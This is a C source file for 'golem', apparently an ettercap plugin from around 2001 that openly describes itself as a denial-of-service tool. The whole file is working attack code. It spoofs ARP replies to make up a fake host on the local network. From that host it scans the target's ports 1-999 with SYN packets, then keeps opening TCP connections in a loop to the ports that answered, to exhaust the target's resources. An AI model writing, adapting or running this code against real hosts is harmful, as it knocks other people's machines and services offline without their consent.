/*
    golem -- ettercap plugin --  a nice D.O.S. :)

    Copyright (C) 2001  NaGoR

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

    $Id: golem.c,v 1.5 2002/02/10 10:07:01 alor Exp $
*/

#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

#include "../../src/include/ec_main.h"
#include "../../src/include/ec_plugins.h"
#include "../../src/include/ec_inet_structures.h"
#include "../../src/include/ec_inet.h"
#include "../../src/include/ec_inet_forge.h"


#define SYN_SEQ 0xabadc0de

// global data...

int IPS, IPD, sock, MTU, CID1, CID2, *port_index;
unsigned short PORTS, IP_ID;
short *PORTREP;
unsigned char MACS[6];
unsigned char MACD[6];
char *pck_to_send;

// protos...

int Plugin_Init(void *);
int Plugin_Fini(void *);
int golemizer(void *dummy);
void Parse_packet(char *buffer);
int Fake_Host(void);

// plugin operation

struct plugin_ops ops = {
   ettercap_version: VERSION,
   plug_info:        "nice D.O.S.  BE CAREFUL !!",
   plug_version:     19,
   plug_type:        PT_EXT,
   hook_point:       HOOK_NONE,
   hook_function:    &golemizer,
};

//==================================

int Plugin_Init(void *params)
{
   return Plugin_Register(params, &ops);
}

int Plugin_Fini(void *params)
{
   return 0;
}

// =================================

void Parse_packet(char *buffer)
{
   IP_header  *ip;
   TCP_header *tcp;

   ip = (IP_header *) (buffer+ETH_HEADER);
   if (ip->source_ip==IPD && ip->dest_ip==IPS && ip->proto==IPPROTO_TCP)
   {
      tcp = (TCP_header *) ((int)ip + ip->h_len * 4);
      if ( (tcp->flags & TH_SYN) && (tcp->flags & TH_ACK) )
      {
         int i;
         for (i=0; i<*port_index; i++)
             if (ntohs(tcp->source)==PORTREP[i]) break;

         if (i==*port_index)
         {
            PORTREP[i]=ntohs(tcp->source);
            *port_index=*port_index+1;
         }

         Inet_Forge_ethernet( pck_to_send, MACS, MACD, ETH_P_IP );
         Inet_Forge_ip( pck_to_send + ETH_HEADER, IPS, IPD, TCP_HEADER, IP_ID++, 0, IPPROTO_TCP);
         Inet_Forge_tcp( pck_to_send + ETH_HEADER + IP_HEADER, ntohs(tcp->dest), ntohs(tcp->source),  SYN_SEQ+1, ntohl(tcp->seq)+1, TH_ACK, 0, 0);

         Inet_SendRawPacket(sock, pck_to_send, ETH_HEADER + IP_HEADER + TCP_HEADER );
      }
   }
}



int Fake_Host(void)
{
   unsigned int N_hosts, i, i1=0, i2, base_ip, fake_ip=0;
   unsigned long NetMask;

   Inet_GetIfaceInfo(Options.netiface, NULL, NULL, NULL, &NetMask);
   N_hosts = ntohl(~NetMask);

   base_ip = inet_addr(Host_In_LAN[0].ip)&NetMask;

   for (i=1; i<N_hosts; i++)
   {
      fake_ip = base_ip|htonl(i);
      for (i2=0; i2 < number_of_hosts_in_lan; i2++)
         if (fake_ip == inet_addr(Host_In_LAN[i2].ip))
            break;
      if (i2 == number_of_hosts_in_lan) break;
   }

   if (i1 == N_hosts) return 0;

   return (fake_ip);
}



int golemizer(void *dummy)
{
    int key, i;
    char cont[10];

    if (!strcmp(Host_Dest.ip,""))
    {
      Plugin_Output("Please select a Dest...\n");
      return 0;
    }

    if (number_of_connections != -1)
    {
      Plugin_Output("This plugin can't be used from connection list interface !!\n");
      return 0;
    }

    memset(cont, 0, 10);

    Plugin_Output("\nAre you sure you want to Golemize %s ? (yes/no) ", Host_Dest.ip );
    Plugin_Input(cont, 5, P_BLOCK);
    if (strncmp(cont, "yes", 3))  // not sure... ;)
    {
      Plugin_Output("\nIt is safe!  for now...\n");
      return 0;
    }

    Plugin_Output("Building host list for netmask %s, please wait...\n", Inet_MySubnet());
    number_of_hosts_in_lan = Inet_HostInLAN();

    for (i=0; i<number_of_hosts_in_lan; i++)
      if (!strcmp(Host_Dest.ip, Host_In_LAN[i].ip))
         Inet_GetMACfromString(Host_In_LAN[i].mac, MACD);

    IPS = Fake_Host();
    if (IPS == 0)
    {
      Plugin_Output("I can't find an unused IP in this LAN.\n");
      Plugin_Output("I can't create the Fake Host\n");
      return 0;
    }
    IPD = inet_addr(Host_Dest.ip);

    sock = Inet_OpenRawSock(Options.netiface);
    Inet_GetIfaceInfo(Options.netiface, &MTU, MACS, 0, 0);

    key = shmget(0,15000,IPC_CREAT | 0600);
    port_index = (int *)shmat(key,0,0);
    shmctl(key, IPC_RMID, NULL);
    PORTREP = (short *)(port_index+1);
    memset(PORTREP,0,4096*sizeof(short));
    srand(time(0));
    IP_ID = PORTS = rand()%(0xFFFE)+1;
    *port_index = 0;

    if (! (CID1=fork()) )
    {
         pck_to_send = (char *)Inet_Forge_packet( ETH_HEADER + ARP_HEADER );
         Inet_Forge_ethernet( pck_to_send, MACS, MACD, ETH_P_ARP );
         Inet_Forge_arp( pck_to_send+ETH_HEADER, ARPOP_REPLY, MACS, IPS, MACD, IPD);

         for (;;)
         {
            Inet_SendRawPacket(sock, pck_to_send, ETH_HEADER + ARP_HEADER);
            sleep(2);
         }
    }

    pck_to_send = (char *)Inet_Forge_packet( ETH_HEADER + IP_HEADER + TCP_HEADER );

    if (! (CID2=fork()) )
    {
         char *recv_pck;

         for (i=1; i<1000; i++)
         {
            Inet_Forge_ethernet( pck_to_send, MACS, MACD, ETH_P_IP );
            Inet_Forge_ip( pck_to_send + ETH_HEADER, IPS, IPD, TCP_HEADER, IP_ID++, 0, IPPROTO_TCP);
            Inet_Forge_tcp( pck_to_send + ETH_HEADER + IP_HEADER, PORTS, i,  SYN_SEQ, 0, TH_SYN, 0, 0);
            Inet_SendRawPacket(sock, pck_to_send, ETH_HEADER + IP_HEADER + TCP_HEADER );
            if(!(i%5)) usleep(500);
         }

         recv_pck = (char *)Inet_Forge_packet(MTU);

         for (;;)
         {
            Inet_GetRawPacket(sock, recv_pck, MTU, NULL);
            Parse_packet(recv_pck);
         }
    }
    else
    {
         int ind;
         int OldIndex=0;
         char c[1] = "";
         struct in_addr fake;

         port_index=(int *)shmat(key,0,0);
         PORTREP=(short *)(port_index+1);

         fake.s_addr = IPS;

          Plugin_Output("\nD.O.S.ing: %s  from fake host: %s\n", Host_Dest.ip, inet_ntoa(fake));
          Plugin_Output("\nPress return to stop...\n\n");

         loop
         {
            for (ind=0; ind<(*port_index); ind++)
            {

               for (;OldIndex<(*port_index); OldIndex++)
                  Plugin_Output("Attacking on port %d\n",PORTREP[OldIndex]);

               PORTS++;

               Inet_Forge_ethernet( pck_to_send, MACS, MACD, ETH_P_IP );
               Inet_Forge_ip( pck_to_send + ETH_HEADER, IPS, IPD, TCP_HEADER, IP_ID++, 0, IPPROTO_TCP);
               Inet_Forge_tcp( pck_to_send + ETH_HEADER + IP_HEADER, PORTS, PORTREP[ind],  SYN_SEQ, 0, TH_SYN, 0, 0);
               Inet_SendRawPacket(sock, pck_to_send, ETH_HEADER + IP_HEADER + TCP_HEADER );
               if (!(ind%5)) usleep(500);
            }

            usleep(2000);

            if (Plugin_Input(c, 1, P_NONBLOCK))
            {
               kill(CID1,SIGTERM);
               kill(CID2,SIGTERM);
               Inet_Forge_packet_destroy( pck_to_send );
               Inet_CloseRawSock(sock);
               return 0;
            }
         }
    }
}

/* EOF */
